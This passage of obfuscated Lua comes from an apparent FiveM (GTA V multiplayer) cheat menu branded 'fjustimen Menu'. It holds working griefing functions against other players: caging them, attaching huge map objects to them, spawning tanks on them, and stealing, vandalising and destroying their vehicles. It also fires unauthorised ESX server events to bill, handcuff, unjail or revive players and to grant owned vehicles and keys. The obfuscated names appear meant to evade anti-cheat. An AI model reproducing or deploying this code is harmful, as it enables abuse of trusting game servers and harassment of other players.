                TlEinQlrUD.LKBmXDfxfE(GetPlayerPed(selectedPlayer))
            end

            if fjustimenUI.GwGoBeHRde("~y~Spawn Tank On Guy", "~r~Native") then
                TlEinQlrUD.YvBJwSaYTt(GetPlayerPed(selectedPlayer))
            end

            if fjustimenUI.GwGoBeHRde("~p~Cage Player", "~r~Native") then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = Ggggg(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, waduyh487r64, waduyh487r64, KZjx)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, waduyh487r64, waduyh487r64, KZjx)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, waduyh487r64)
                    FreezeEntityPosition(ea, waduyh487r64)
            end

            if fjustimenUI.GwGoBeHRde("~p~Wall Player", "~r~Native") then
                local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        waduyh487r64,
                        waduyh487r64,
                        KZjx,
                        waduyh487r64,
                        1,
                        waduyh487r64
                    )
        end

            if fjustimenUI.GwGoBeHRde("Spawn ~b~FBI", "~r~Native") then
                local hamburg = "dt1_props_combo0110_slod"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            end

            if fjustimenUI.GwGoBeHRde("Spawn ~b~Sandy Shores", "~r~Native") then
                local hamburg = "cs2_lod_1234_slod3"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            end

            if fjustimenUI.GwGoBeHRde("Spawn ~b~Paleto Bay", "~r~Native") then
                local hamburg = "cs1_lod2_01_7_slod3"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            end

            if fjustimenUI.GwGoBeHRde("~r~Spawn Crazy SHIT On Guy", "~r~Native") then
                TlEinQlrUD.dIwyUZHKyR(GetPlayerPed(selectedPlayer))
            end


            
			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		elseif fjustimenUI.aWlfWfxYaq("ESXMenuPlayer") then
			if fjustimenUI.GwGoBeHRde("~g~ESX ~s~Send Bill") then
				local amount = RNDpymkwNb("Enter Amount", "", 10)
				local name = RNDpymkwNb("Enter the name of the Bill", "", 25)
				if amount and name then
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(SelectedPlayer), "Purposeless", name, amount)
				end
			elseif fjustimenUI.GwGoBeHRde("~g~ESX ~s~Handcuff Player") then
				TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
			elseif fjustimenUI.GwGoBeHRde("~g~ESX ~s~Revive player") then
				TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
			elseif fjustimenUI.GwGoBeHRde("~g~ESX ~s~Unjail player") then
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))
			end

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("OnlineWepMenu") then
			fjustimenUI.iDNuClwTMv("OnlineWepMenu", "Weapon Options - " .. GetPlayerName(SelectedPlayer) .. "")
			fjustimenUI.NgPSWlTpNm("Give Weapon", "OnlineWepCategory")

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("OnlineWepCategory") then
			fjustimenUI.iDNuClwTMv("OnlineWepCategory", "Give Weapon - " .. GetPlayerName(SelectedPlayer) .. "")

			fjustimenUI.NgPSWlTpNm("Melee", "OnlineMeleeWeapons")
			fjustimenUI.NgPSWlTpNm("Handguns", "OnlineSidearmWeapons")
			fjustimenUI.NgPSWlTpNm("Submachine Guns")
			fjustimenUI.NgPSWlTpNm("Shotguns", "OnlineShotgunWeapons")
			fjustimenUI.NgPSWlTpNm("Assault Rifles", "OnlineAutorifleWeapons")
			fjustimenUI.NgPSWlTpNm("Light Machine Guns")
			fjustimenUI.NgPSWlTpNm("Sniper Rifles")
			fjustimenUI.NgPSWlTpNm("Heavy Weapons")

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("OnlineMeleeWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "melee" then
					if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 0, false, false)
					end
				end
			end

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("OnlineSidearmWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "handguns" then
					if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 32, false, false)
					end
				end
			end

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("OnlineAutorifleWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "assaultrifles" then
					if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 60, false, false)
					end
				end
			end

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("OnlineShotgunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "shotguns" then
					if fjustimenUI.GwGoBeHRde(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 18, false, false)
					end
				end
			end

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		
		elseif fjustimenUI.aWlfWfxYaq("OnlineVehicleMenuPlayer") then
			fjustimenUI.iDNuClwTMv("OnlineVehicleMenuPlayer", "Vehicle Options [" .. GetPlayerName(SelectedPlayer) .. "]")
			if fjustimenUI.GwGoBeHRde("Spawn Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = RNDpymkwNb("Enter Vehicle Model Name", "", 12)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(GetPlayerPed(SelectedPlayer)), GetEntityHeading(GetPlayerPed(SelectedPlayer)), true, true)
					
					hfSPELVLBp(ped)
					SetPedIntoVehicle(ped, veh, -1)
					TaskWarpPedIntoVehicle(ped, veh, -1)
					fjustimenUI.SendNotification({text = LBkvSThEMN("Successfully spawned ~b~%s ~s~on ~b~%s", string.lower(GetDisplayNameFromVehicleModel(ModelName)), GetPlayerName(SelectedPlayer)), type = "info"})
				else
					fjustimenUI.SendNotification({text = "Model is not valid", type = "error"})
				end
			end
			if fjustimenUI.GwGoBeHRde("Spawn Owned Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = RNDpymkwNb("Enter Vehicle Spawn Name", "", 20)
				local newPlate =  RNDpymkwNb("Enter Vehicle License Plate", "", 8)

				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					SetVehicleNumberPlateText(veh, newPlate)
					local vehicleProps = fjustimen.Game.GetVehicleProperties(veh)
					TriggerServerEvent('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					TriggerServerEvent('esx_givecarkeys:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					TriggerServerEvent('garage:addKeys', newPlate)
					SetPedIntoVehicle(GetPlayerPed(SelectedPlayer), veh, -1)
				else
					fjustimenUI.SendNotification({ text = "Vehicle model " .. ModelName .. " does not exist!", type = "error"})
				end
			end
			if fjustimenUI.GwGoBeHRde("Kick From Vehicle") then
				ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			end
			if fjustimenUI.GwGoBeHRde("Delete Vehicle") then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local veh = GetVehiclePedIsIn(playerPed)
				uloTRbVjGn(veh)
			end
			if fjustimenUI.GwGoBeHRde("Destroy Engine") then

				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsUsing(playerPed)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)

				hfSPELVLBp(playerVeh)

				--SetVehicleUndriveable(veh, true)
				SetVehicleEngineHealth(playerVeh, 0)
			end
			if fjustimenUI.GwGoBeHRde("Steal Vehicle") then

				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				local StealVehicleThread = PvxydtgrmB(vehicle)
				LUtjuLMzHY(StealVehicleThread)
			end

			if fjustimenUI.GwGoBeHRde("Repair Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				ejKYqZHiGy(vehicle)
			end

			if fjustimenUI.GwGoBeHRde("Vandalize Car") then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)
				StartVehicleAlarm(playerVeh)
				DetachVehicleWindscreen(playerVeh)
				SmashVehicleWindow(playerVeh, 0)
				SmashVehicleWindow(playerVeh, 1)
				SmashVehicleWindow(playerVeh, 2)
				SmashVehicleWindow(playerVeh, 3)
				SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
				SetVehicleDoorBroken(playerVeh, 0, true)
				SetVehicleDoorBroken(playerVeh, 1, true)
				SetVehicleDoorBroken(playerVeh, 2, true)
				SetVehicleDoorBroken(playerVeh, 3, true)
				SetVehicleDoorBroken(playerVeh, 4, true)
				SetVehicleDoorBroken(playerVeh, 5, true)
				SetVehicleDoorBroken(playerVeh, 6, true)
				SetVehicleDoorBroken(playerVeh, 7, true)
				SetVehicleLights(playerVeh, 1)
				Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
				SetVehicleNumberPlateTextIndex(playerVeh, 5)
				SetVehicleNumberPlateText(playerVeh, "fjustimen Menu")
				SetVehicleDirtLevel(playerVeh, 10.0)
				SetVehicleModColor_1(playerVeh, 1)
				SetVehicleModColor_2(playerVeh, 1)
				SetVehicleCustomPrimaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b) -- r = 231, g = 76, b = 60
				SetVehicleCustomSecondaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b)
				SetVehicleBurnout(playerVeh, true)
				fjustimenUI.SendNotification("~g~Vehicle Fucked Up!")
			end

			fjustimenUI.LWmTkinCNg(SelectedPlayer)
			fjustimenUI.pyCDRpSJBU()
		end

		for i, mods in pairs(EbEFecYGjP.vehicleMods) do
			if mods.meta == "modHorns" then
				if fjustimenUI.aWlfWfxYaq(mods.meta) then
					for j = 0, 51, 1 do
						if j == currentMods[mods.meta] then
							if fjustimenUI.GwGoBeHRde(EbEFecYGjP.RKtAvXCOgM(j), "Installed", nil, _menuColor.base) then 
								RemoveVehicleMod(fjustimen.Player.Vehicle, mods.id)
								EbEFecYGjP.GeEFnatGQP()
							end
						else
							if fjustimenUI.GwGoBeHRde(EbEFecYGjP.RKtAvXCOgM(j), "Not Installed") then 
								SetVehicleMod(fjustimen.Player.Vehicle, mods.id, j)
								EbEFecYGjP.GeEFnatGQP()
							end
						end
					end
					fjustimenUI.pyCDRpSJBU()
				end
			elseif mods.meta == "modFrontWheels" or mods.meta == "modBackWheels" then
				if fjustimenUI.aWlfWfxYaq(mods.meta) then
					local modCount = GetNumVehicleMods(fjustimen.Player.Vehicle, mods.id)
					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(fjustimen.Player.Vehicle, mods.id, j)
						if modName then
							if j == currentMods[mods.meta] then
								if fjustimenUI.GwGoBeHRde(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
									RemoveVehicleMod(fjustimen.Player.Vehicle, mods.id)
									EbEFecYGjP.GeEFnatGQP()
								end
							else
								if fjustimenUI.GwGoBeHRde(GetLabelText(modName), "Not Installed") then 
									SetVehicleMod(fjustimen.Player.Vehicle, mods.id, j)
									EbEFecYGjP.GeEFnatGQP()
								end
							end
						end
					end
					fjustimenUI.pyCDRpSJBU()
				end
			else
				if fjustimenUI.aWlfWfxYaq(mods.meta) then
					local modCount = GetNumVehicleMods(fjustimen.Player.Vehicle, mods.id)
					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(fjustimen.Player.Vehicle, mods.id, j)
						if modName then
							if j == currentMods[mods.meta] then
								if fjustimenUI.GwGoBeHRde(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
									RemoveVehicleMod(fjustimen.Player.Vehicle, mods.id)
									EbEFecYGjP.GeEFnatGQP()
								end
							else
								if fjustimenUI.GwGoBeHRde(GetLabelText(modName), "Not Installed") then 
									SetVehicleMod(fjustimen.Player.Vehicle, mods.id, j)
									EbEFecYGjP.GeEFnatGQP()
								end
							end
						end
					end
					fjustimenUI.pyCDRpSJBU()
				end
			end
		end
		Wait(0)
	end
end
IOeFDEouNG(alPjfoihKr)